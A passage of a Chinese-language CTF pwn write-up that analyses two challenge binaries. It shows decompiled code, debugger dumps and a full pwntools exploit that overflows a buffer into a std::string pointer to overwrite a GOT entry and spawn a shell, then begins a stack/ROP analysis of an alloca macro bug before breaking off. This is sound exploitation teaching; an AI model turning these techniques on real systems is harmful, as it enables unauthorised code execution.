class="keyword">case</span> <span class="number">1</span>: <span class="comment">// set c_str</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;c_str: &quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; test.c_str();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// get c_str</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;c_str: &quot;</span> &lt;&lt; test.c_str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>: <span class="comment">// set str</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;str: &quot;</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; test.str();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// get str</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;str: &quot;</span> &lt;&lt; test.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>: <span class="comment">// otherwise exit</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;bye!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对照 ida 来看<br>定义的函数连函数指针都没放在结构体力 只有 string 的指针和 char 这个字符数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rax</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v16; <span class="comment">// rax</span></span><br><span class="line">  __int64 v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-64h] BYREF</span></span><br><span class="line">  <span class="type">char</span> test[<span class="number">72</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v23; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v23 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test::Test((Test *)test);                     <span class="comment">// 创建一个对象</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;1. set c_str&quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v5 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v4, <span class="string">&quot;2. get c_str&quot;</span>);</span><br><span class="line">  v6 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v5, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v7 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v6, <span class="string">&quot;3. set str&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(v7, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v9 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v8, <span class="string">&quot;4. get str&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::operator&lt;&lt;(v9, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> __int8)<span class="built_in">std</span>::ios::good(&amp;unk_404230) )<span class="comment">// ctrl + d exit good</span></span><br><span class="line">  &#123;</span><br><span class="line">    choice = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::istream::operator&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">4</span> )                          <span class="comment">// std::cout &lt;&lt; &quot;str: &quot; &lt;&lt; test.str() &lt;&lt; std::endl;</span></span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;str: &quot;</span>);</span><br><span class="line">      v16 = Test::str[abi:cxx11](test);         <span class="comment">// [1] &lt;&lt;- 其实就是返回一个地址</span></span><br><span class="line">      v17 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="type">char</span>&gt;(v15, v16);</span><br><span class="line">      <span class="built_in">std</span>::ostream::operator&lt;&lt;(v17, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( choice &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">switch</span> ( choice )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:                                 <span class="comment">// std::cout &lt;&lt; &quot;str: &quot;;</span></span><br><span class="line">          <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;str: &quot;</span>);</span><br><span class="line">          v14 = Test::str[abi:cxx11](test);</span><br><span class="line">          <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v14);<span class="comment">// std::cin &gt;&gt; test.str();</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:                                 <span class="comment">// std::cout &lt;&lt; &quot;c_str: &quot;;</span></span><br><span class="line">          <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;c_str: &quot;</span>);</span><br><span class="line">          v10 = Test::c_str((Test *)test);      <span class="comment">// return this</span></span><br><span class="line">          <span class="built_in">std</span>::operator&gt;&gt;&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v10);<span class="comment">// std::cin &gt;&gt; test.c_str();</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:                                 <span class="comment">// std::cout &lt;&lt; &quot;c_str: &quot; &lt;&lt; test.c_str() &lt;&lt; std::endl;</span></span><br><span class="line">          v11 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;c_str: &quot;</span>);</span><br><span class="line">          v12 = Test::c_str((Test *)test);</span><br><span class="line">          v13 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(v11, v12);</span><br><span class="line">          <span class="built_in">std</span>::ostream::operator&lt;&lt;(v13, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">LABEL_13:</span><br><span class="line">          v18 = <span class="built_in">std</span>::operator&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;bye!&quot;</span>);</span><br><span class="line">          <span class="built_in">std</span>::ostream::operator&lt;&lt;(v18, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="type">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">          v19 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = <span class="number">1</span>;</span><br><span class="line">LABEL_15:</span><br><span class="line">  Test::~Test((Test *)test);</span><br><span class="line">  <span class="keyword">return</span> v19;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入 0x1f 个 A 到 char 里和 0x8 个到 string 里<br>可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x007fff9d71f280</span>│+<span class="number">0x0000</span>: <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="number">0x007fff9d71f288</span>│+<span class="number">0x0008</span>: <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="number">0x007fff9d71f290</span>│+<span class="number">0x0010</span>: <span class="string">&quot;AAAAAAAAAAAAAAA&quot;</span></span><br><span class="line"><span class="number">0x007fff9d71f298</span>│+<span class="number">0x0018</span>: <span class="number">0x41414141414141</span> (<span class="string">&quot;AAAAAAA&quot;</span>?)</span><br><span class="line"><span class="number">0x007fff9d71f2a0</span>│+<span class="number">0x0020</span>: <span class="number">0x007fff9d71f2b0</span>  →  <span class="string">&quot;BBBBBBBB&quot;</span></span><br><span class="line"><span class="number">0x007fff9d71f2a8</span>│+<span class="number">0x0028</span>: <span class="number">0x0000000000000008</span></span><br><span class="line"><span class="number">0x007fff9d71f2b0</span>│+<span class="number">0x0030</span>: <span class="string">&quot;BBBBBBBB&quot;</span></span><br></pre></td></tr></table></figure><p>string 第一个是指针 指向堆上<br>我们可以劫持这个指针来进行任意写 具体原因如下</p><blockquote><p><code>string</code>  は「文字列を格納するアドレス (8bytes), 長さ (8bytes), 文字列 (短ければここに、長ければ heap 上に)」<br>という構造をしています。なので「文字列を格納するアドレス」を  <code>test.c_str()</code>  のオーバーフローで<br>書き換えれば GOT に任意書き込みができます。これで  <code>call_me</code>  を呼べるようにします。</p></blockquote><p>至于最后一个难题就是选择 got 表了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x404018</span> &lt;_ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_@got.plt&gt;: <span class="number">0x0000000000401030</span>      <span class="number">0x00007ffff7ee5d70</span></span><br><span class="line"><span class="number">0x404028</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@got.plt&gt;:   <span class="number">0x0000000000401050</span>      <span class="number">0x0000000000401060</span></span><br><span class="line"><span class="number">0x404038</span> &lt;__cxa_atexit@got.plt&gt;:        <span class="number">0x00007ffff7c07de0</span>      <span class="number">0x0000000000401080</span></span><br><span class="line"><span class="number">0x404048</span> &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt&gt;:     <span class="number">0x00007ffff7f01bb0</span>      <span class="number">0x00007ffff7f006d0</span></span><br><span class="line"><span class="number">0x404058</span> &lt;__stack_chk_fail@got.plt&gt;:    <span class="number">0x00000000004010b0</span>      <span class="number">0x00000000004010c0</span></span><br><span class="line"><span class="number">0x404068</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@got.plt&gt;:   <span class="number">0x00007ffff7f114b0</span>      <span class="number">0x00007ffff7c4cad0</span></span><br><span class="line"><span class="number">0x404078</span> &lt;_ZNSt8ios_base4InitC1Ev@got.plt&gt;:     <span class="number">0x00007ffff7e890f0</span>      <span class="number">0x00007ffff7ee2bb0</span></span><br><span class="line"><span class="number">0x404088</span> &lt;_Unwind_Resume@got.plt&gt;:      <span class="number">0x0000000000401110</span>      <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>个人最开始是写 <code>__stack_chk_fail</code>  的 然后想着用 pwntools 的 shutdown<br> 但是析构的时候会 free 掉 string 导致系统提前崩<br>所以按 wp 就是改 <code>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</code>  了<br>具体可能是试一个个出来的</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&quot;Linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info    = <span class="keyword">lambda</span> tag, addr          :p.info(<span class="string">&#x27;======&gt;&#x27;</span>+tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">ir      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">ri      = <span class="keyword">lambda</span>                    :raw_input()</span><br><span class="line">ps      = <span class="keyword">lambda</span>                    :pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">struct Test &#123;</span></span><br><span class="line"><span class="string">char _c_str[0x20];</span></span><br><span class="line"><span class="string">std::string _str;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_c_str</span>(<span class="params">data</span>):</span><br><span class="line">sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;c_str: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_c_str</span>():</span><br><span class="line">sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_str</span>(<span class="params">data</span>):</span><br><span class="line">sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;str: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_str</span>():</span><br><span class="line">sla(<span class="string">&quot;choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b *0x4013E6</span></span><br><span class="line">got = <span class="number">0x404048</span> <span class="comment"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@got.plt</span></span><br><span class="line">binsh = <span class="number">0x4016DE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">set_c_str(<span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span> + p64(got))</span><br><span class="line">set_str(p64(binsh))</span><br><span class="line">ir()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h1 id="smal_arey"><a class="markdownIt-Anchor" href="#smal_arey">#</a> smal_arey</h1><p>只开了 NX</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">long</span> size, index, *arr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;size) != <span class="number">1</span> || size &lt; <span class="number">0</span> || size &gt; <span class="number">5</span>)<span class="comment">// 1 2 3 4</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  arr = ARRAY_NEW(size);                   [<span class="number">1</span>] &lt;&lt;- 在栈上申请 n + <span class="number">1</span> 个size</span><br><span class="line">  <span class="title function_">while</span> <span class="params">(<span class="number">1</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;index) != <span class="number">1</span> || index &lt; <span class="number">0</span> || index &gt;= size)</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;arr[index]);             [<span class="number">2</span>] &lt;&lt;- 在size范围内进行任意四字节的读写</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  alarm(<span class="number">180</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>alloca</code>  是在栈上分配内存 并自动释放<br>其实就一个指针指向栈上 然后 rsp 减下去罢了<br>宏的分配问题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_SIZE(n) (n * sizeof(long))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ARRAY_NEW(n) (long*)alloca(ARRAY_SIZE(n + 1))</span></span><br><span class="line"></span><br><span class="line">=&gt; alloca(n + <span class="number">1</span> * <span class="keyword">sizeof</span>(<span class="type">long</span>))</span><br></pre></td></tr></table></figure><p>然后 <code>size</code>  如果能被覆盖的话 idx 就能越界了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line"><span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-20h] BYREF</span></span><br></pre></td></tr></table></figure><p>这个 alloca 其实就是减去 rsp 然后往栈顶存放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7ffd12538830</span> —▸ <span class="number">0x4013e3</span> (__libc_csu_init+<span class="number">99</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffd12538838</span> —▸ <span class="number">0x404020</span> (<span class="built_in">printf</span>@got.plt) —▸ <span class="number">0x7f2a5fcc3c90</span> (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7ffd12538840</span> —▸ <span class="number">0x401094</span> (<span class="built_in">printf</span>@plt+<span class="number">4</span>) ◂— bnd jmp qword ptr [rip + <span class="number">0x2f85</span>]</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7ffd12538848</span> —▸ <span class="number">0x4010d0</span> (_start) ◂— endbr64</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7ffd12538850</span> ◂— <span class="number">0x7fffffffffffffff</span>            [<span class="number">1</span>] &lt;- size</span><br></pre></td></tr></table></figure><p><code>%ld</code>  的最大写入为 <code>0x7fffffffffffffff</code> <br> 可以覆盖掉 size 和 arr 达到 got 表任意写的效果 可以通过不合法的值触发 exit</p><p>再看看返回地址<br>如果在栈中触发 exit 的 got 会压入返回地址<br>只需要让 rsp+8 就能执行 ROP 了 也就是写个 pop ret</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rsp <span class="number">0x7ffd12538830</span> —▸ <span class="number">0x4013e3</span> (__libc_csu_init+<span class="number">99</span>) ◂— pop    rdi</span><br><span class="line">    <span class="number">0x7ffd12538838</span> —▸ <span class="number">0x404020</span> (<span class="built_in">printf</span>@got.plt) —▸ <span class="number">0x7f2a5fcc3c90</span> (<span class="built_in">printf</span>) ◂— endbr64</span><br><span class="line">    <span class="number">0x7ffd12538840</span> —▸ <span class="number">0x401094</span> (<span class="built_in">printf</span>@plt+<span class="number">4</span>) ◂— bnd jmp qword ptr [rip + <span class="number">0x2f85</span>]</span><br><span class="line">    <span class="number">0x7ffd12538848</span> —▸ <span class="number">0x4010d0</span> (_start) ◂— endbr64</span><br><span class="line">    <span 